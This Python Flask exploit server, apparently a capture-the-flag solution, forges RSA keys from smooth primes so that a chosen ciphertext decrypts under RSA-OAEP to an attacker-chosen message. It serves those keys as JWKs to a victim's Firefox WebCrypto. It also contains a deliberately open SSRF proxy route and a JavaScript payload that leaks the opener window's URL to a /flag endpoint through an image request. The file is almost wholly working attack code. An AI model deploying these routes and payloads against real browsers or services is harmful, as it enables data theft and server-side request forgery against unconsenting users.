from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Util.number import (
    long_to_bytes,
    bytes_to_long,
    ceil_div,
    size,
    getPrime,
    isPrime,
    sieve_base,
)
from Crypto.Hash import SHA256
from sage.all import GF, crt, proof, lcm
from base64 import *
from random import randint
from flask import Flask, request, jsonify, send_file, make_response
from urllib.parse import unquote_plus
from functools import lru_cache
import requests
import os
import json

proof.arithmetic(False)


def pkcs1_oaep_pad(msg, nsize):
    key = RSA.generate(nsize)
    k = ceil_div(size(key.n), 8)
    cipher = PKCS1_OAEP.new(key, hashAlgo=SHA256)
    m_int = bytes_to_long(cipher.encrypt(msg))
    em = long_to_bytes(key._decrypt(m_int), k)
    return em


def product(xs):
    r = 1
    for x in xs:
        r *= x
    return r


def getSmoothPrime(n, b):
    x = 2 * product([getPrime(b) for _ in range(n // b)])
    while True:
        xx = x * getPrime(n - x.bit_length())
        p = xx + 1
        if isPrime(p):
            return p


def getSmoothPrime(n, base):
    while True:
        used = set()
        x = 2
        for p in base:
            if x.bit_length() >= n:
                break
            if randint(0, 1) == 1:
                used.add(p)
                x *= p
                p = x + 1
                if p.bit_length() == n and isPrime(p):
                    return p, used


@lru_cache(maxsize=100)
def get_suitable_key(random_ct, target_msg):
    fit_k = 8 * len(random_ct)
    print(f"{fit_k = }")
    random_ct_int = bytes_to_long(random_ct)

    base = set(sieve_base[300:])
    p, used = getSmoothPrime(fit_k // 2, base)
    print(used)
    base -= used
    q, used2 = getSmoothPrime(fit_k // 2, base)
    print(used2)
    p, q = sorted([p, q])
    n = p * q
    Fp = GF(p)
    Fq = GF(q)
    assert random_ct_int < n

    while True:
        try:
            padded = pkcs1_oaep_pad(target_msg, fit_k)
            padded_int = bytes_to_long(padded)
            dp = int(Fp(padded_int).log(random_ct_int))
            dq = int(Fq(padded_int).log(random_ct_int))
            op = Fp(random_ct_int).multiplicative_order()
            oq = Fq(random_ct_int).multiplicative_order()
            d = int(crt([dp, dq], [op, oq]))
            e = pow(d, -1, int(lcm(p - 1, q - 1)))
        except ValueError as ex:
            print(ex)
            continue
        break
    key = RSA.construct([n, e, d, p, q])
    assert key._decrypt(random_ct_int) == padded_int
    assert PKCS1_OAEP.new(key, hashAlgo=SHA256).decrypt(random_ct) == target_msg
    return key


def urlb64encode(x: bytes) -> str:
    return urlsafe_b64encode(x).decode().rstrip("=")


def encode_int(i):
    return urlb64encode(long_to_bytes(i))


def export_as_jwk(key):
    return {
        "kty": "RSA",
        "alg": "RSA-OAEP-256",
        "n": encode_int(key.n),
        "e": encode_int(key.e),
        "d": encode_int(key.d),
        "p": encode_int(key.p),
        "q": encode_int(key.q),
        "dp": encode_int(key.d % (key.p - 1)),
        "dq": encode_int(key.d % (key.q - 1)),
        "qi": encode_int(pow(key.q, -1, key.p)),
        "ext": True,
        "key_ops": ["decrypt"],
    }


app = Flask(__name__)


@app.get("/")
def index():
    return send_file("exp.html")


@app.post("/proxy")
def proxy():
    # who cares about ssrf anyway?
    return requests.get(request.json["url"]).text


@app.post("/get_key")
def get_key():
    random_ct = b64decode(request.json["random_ct"])
    target_msg = b64decode(request.json["target_msg"])
    key = get_suitable_key(random_ct, target_msg)
    return jsonify(export_as_jwk(key))


@app.get("/api/<path:unused>")
def api(unused):
    resp = make_response(
        "(new Image).src='/flag?x='+encodeURIComponent(opener.location.href)"
    )
    resp.headers["Content-Type"] = "text/javascript"
    return resp


@app.get("/flag")
def flag():
    print("FLAG URL", unquote_plus(request.args["x"]))
    return "peko"


app.run(port=8001, threaded=False)

# the reason for using FireFox:
# https://source.chromium.org/chromium/chromium/src/+/main:components/webcrypto/algorithms/rsa.cc;l=196;drc=26f382174adc04c0d92e7dff24c6aed5d5e0246b
# shows that Chromium will do some check about your RSA private key
# and the BoringSSL RSA_check_key function will call rsa_check_public_key, which ensures that e is less than 33 bits to prevent DoS
# https://source.chromium.org/chromium/chromium/src/+/main:third_party/boringssl/src/crypto/fipsmodule/rsa/rsa_impl.c;l=88-106;drc=26f382174adc04c0d92e7dff24c6aed5d5e0246b
